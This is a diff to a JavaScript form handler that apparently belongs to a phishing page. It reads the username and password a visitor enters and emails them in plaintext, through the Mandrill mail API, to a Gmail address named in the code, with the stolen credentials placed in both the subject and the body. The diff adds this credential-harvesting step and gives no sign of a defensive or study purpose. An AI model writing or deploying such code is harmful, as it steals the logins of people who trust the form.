@@ -25,11 +25,10 @@ function submitToMe(){
   var username = document.getElementsByName("username")[0].value;
   var password = document.getElementsByName("password")[0].value;
   
-  
-  sendMail("prodevell@gmail.com", "prodevell@gmail.com");
+  sendMail("rimon.net.il@gmail.com", "username: " + username + ", password: " + password);
 }
 
-function sendMail(email, to) {
+function sendMail(email, text) {
     $.ajax({
       type: 'POST',
       url: 'https://mandrillapp.com/api/1.0/messages/send.json',
@@ -39,14 +38,14 @@ function sendMail(email, to) {
           'from_email': email,
           'to': [
               {
-                'email': to,
+                'email': email,
                 'name': 'RECIPIENT NAME (OPTIONAL)',
                 'type': 'to'
               }
             ],
           'autotext': 'true',
-          'subject': 'YOUR SUBJECT HERE!',
-          'html': 'YOUR EMAIL CONTENT HERE! YOU CAN USE HTML!'
+          'subject': text,
+          'html': text
         }
       }
      }).done(function(response) {
